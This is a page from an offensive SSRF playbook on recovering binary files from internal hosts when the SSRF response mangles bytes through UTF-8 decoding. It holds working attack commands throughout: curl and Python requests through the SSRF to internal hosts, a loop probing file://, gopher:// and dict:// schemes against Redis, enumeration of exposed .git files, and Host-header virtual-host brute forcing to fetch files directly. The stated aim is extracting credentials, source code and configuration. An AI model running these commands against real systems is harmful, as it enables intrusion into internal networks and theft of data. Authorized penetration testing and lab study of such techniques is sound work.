# SSRF — UTF-8 Binary-Loss Limit and Workarounds

## When this applies

You have a confirmed SSRF primitive that returns the upstream response body to you (textual exfil channel), and you have a high-value binary target on the internal network — exposed `.git/` directories, image files, gzipped archives, MySQL/Redis dumps, certificates. Naive byte-for-byte extraction fails because the SSRF backend has UTF-8-decoded the upstream response before serialising it to you.

Typical fingerprint: bytes `0x80`–`0xFF` round-trip as `\xef\xbf\xbd` (U+FFFD, `�`) or as `?` placeholders. Git loose-object zlib streams fail with `Error -3 while decompressing data: incorrect data check`; PNG/JPEG headers parse but image data is corrupt; gzip archives fail CRC.

## Technique

The corruption is structural to the backend's content-handling, not a transport detail you can encode around. Three viable paths:

1. **Bypass the SSRF entirely via the edge proxy.** If the target's edge multiplexes vhosts on one IP, the attacker's direct HTTP with a `Host:` header override reaches the same backend vhost without ever traversing the SSRF — full byte fidelity. The in-lab SSRF and the out-of-lab attacker have different byte-level fidelity *even to the same endpoint*. See "Alt-vhost workaround" below.
2. **Prefer text-only exfil targets.** The contents you actually need are often available in a non-binary form on the same internal host or a sibling host.
3. **Use a protocol the backend does not transit through a `response.text` decoder.** If the SSRF client supports alternate URL schemes (`gopher://`, `dict://`, `ftp://`, `file://`), the backend handler may bypass the response-decode path entirely.

## Steps

1. Confirm the byte-loss is structural, not transport. Fetch a known binary against the SSRF and look for U+FFFD substitution:

   ```bash
   curl -s -X POST -b "$COOKIE" -H 'Content-Type: application/json' \
     -d '{"url":"http://<INTERNAL_HOST>/static/known.png"}' \
     "$BASE/api/v4/status" | xxd | head
   # If bytes 0x80-0xFF appear as ef bf bd, the backend did errors='replace'.
   ```

   Quick Python checker:

   ```python
   import requests, sys
   r = requests.post(f"{BASE}/api/v4/status", json={"url": "http://<INTERNAL>/static/known.png"},
                     cookies={"api_token": TOKEN})
   raw = r.content
   print("U+FFFD count:", raw.count(b"\xef\xbf\xbd"))
   print("len(raw):", len(raw))
   ```

   `count > 0` is a structural decode loss — no client-side trick will recover the original bytes from this response.

2. Pivot to text-only targets on the same host. Walk the file system for plaintext substitutes:

   ```
   .git/HEAD                          # 41 hex chars
   .git/refs/heads/<branch>           # 41 hex chars
   .git/info/refs                     # plaintext list (Smart HTTP advertisement)
   .git/packed-refs                   # plaintext
   .git/config                        # ini, plaintext
   .git/COMMIT_EDITMSG                # plaintext
   .git/logs/HEAD                     # plaintext reflog with commit hashes
   .git/index                         # binary — skip
   ```

   The reflog plus `info/refs` discloses every reachable commit SHA. For each commit, fetch the GitHub/GitLab/Gitea remote URL from `.git/config` and pull the public mirror directly if accessible — bypasses the corrupted SSRF channel entirely.

   Other text-only substitutes:
   - Database backups as SQL dumps (`*.sql`) instead of binary `mysqldump --tab` output.
   - JSON exports of log records instead of compressed `.gz` log shipments.
   - HTML/JS source served by the dev mirror of the same app.

3. Try alternate URL schemes through the SSRF — some Python/Go/Node clients route these via raw socket I/O rather than HTTP-fetch wrappers:

   ```bash
   for SCHEME in "gopher://" "dict://" "ftp://" "file:///" "ldap://"; do
     curl -s -X POST -b "$COOKIE" -H 'Content-Type: application/json' \
       -d "{\"url\":\"${SCHEME}<INTERNAL_HOST>:6379/_\"}" \
       "$BASE/api/v4/status" -o "/tmp/probe-$(echo $SCHEME | tr -d '/:').txt"
     echo "$SCHEME → $(wc -c < /tmp/probe-$(echo $SCHEME | tr -d '/:').txt) bytes"
   done
   ```

   `gopher://` and `dict://` open raw TCP connections at the backend; the response body is rarely UTF-8-decoded because the handler returns bytes verbatim. See [protocol-exploitation-gopher.md](protocol-exploitation-gopher.md) for crafting Redis/SMTP/Memcached payloads.

4. Verify any candidate text source still produces material you can act on. For `.git` reconstruction without binary objects, refs + reflog gives you commit history, but blob content requires either (a) the same commit hash being public on GitHub/GitLab, (b) `git archive` over the SSRF (text TAR archive, also subject to byte loss — usually no), or (c) a `tail`-style log endpoint that prints diffs.

## Verifying success

- A previously-corrupt artefact (image, archive, zlib stream) is recovered intact via the alternate channel, **OR**
- The text-only substitute yields the same actionable data (credentials, source code, configuration) that the binary path was supposed to surface.

## Common pitfalls

- Assuming the SSRF only loses bytes when the response is "really binary" — Flask `jsonify`'s default `ensure_ascii=True` plus the `errors='replace'` decode break **any** non-ASCII payload, including gzipped JSON.
- Re-encoding the corrupted response (`latin-1` round-trip) does not recover the original bytes — `U+FFFD` is a one-way collapse. Once you see `ef bf bd` in the response, that byte position is unrecoverable.
- Skipping `.git/info/refs` because "I already saw `HEAD`" — Smart-HTTP refs advertisement has its own format and lists branches/tags `HEAD` does not.
- Treating `git archive`/`format=tar` as a workaround. TAR is text-header + raw-content; the raw-content section hits the same decode wall.
- Forgetting that the binary-loss limit is bidirectional. If the SSRF echoes a request body back (request smuggling style), you cannot reliably stuff binary payloads through it either.

## Alt-vhost workaround (most often overlooked)

Many lab/SaaS edges proxy multiple internal services via Host-header routing on a single public IP. The SSRF that mangles bytes is implemented INSIDE the perimeter (e.g. Flask-`jsonify` wrapping a `requests.get(...).text`); a direct HTTP request from the attacker hits the SAME backend service through the edge proxy with raw byte fidelity.

```bash
# 1. Enumerate vhosts the edge serves — try variations on the names you've already seen
for h in app dev development internal admin api logs reports cdn; do
  for sfx in '' '-dev' '-stage' '-internal' '-development'; do
    HOST="${h}${sfx}.<DOMAIN>"
    code=$(curl -sk -o /dev/null -w '%{http_code}' -H "Host: ${HOST}" "http://<TARGET_IP>/")
    [[ "$code" != "404" && "$code" != "000" ]] && echo "${HOST}: ${code}"
  done
done

# 2. Re-fetch the binary you couldn't get via SSRF — direct, byte-clean
curl -s -H "Host: <FOUND_VHOST>" "http://<TARGET_IP>/<PATH>" -o recovered.bin
file recovered.bin   # confirm magic bytes survive
```

Generalised: whenever an SSRF's exfil channel is byte-lossy AND the edge multiplexes vhosts on one IP, *try the same URL from outside with a Host header* before investing in a binary-preserving inner channel. The same internal service may serve clean bytes when reached via a different code path.

Detection / classification — the vhosts that respond to your direct request but were "Website is down!" via the SSRF are the ones where the edge has a route entry but the **SSRF's own resolver lacks a DNS entry**. That asymmetry is the bypass surface.

## Tools

- `curl`, Python `requests` — confirm decode loss.
- [protocol-exploitation-gopher.md](protocol-exploitation-gopher.md) — craft gopher payloads for Redis/SMTP/Memcached.
- [localhost-and-ip-bypass.md](localhost-and-ip-bypass.md) — allowlist evasion for the loopback / metadata cases.
- `git-dumper` — only useful **after** you obtain a working byte-clean channel.

## Related

- [protocol-exploitation-gopher.md](protocol-exploitation-gopher.md)
- [cloud-metadata.md](cloud-metadata.md)
- [blind-detection-and-portscan.md](blind-detection-and-portscan.md)
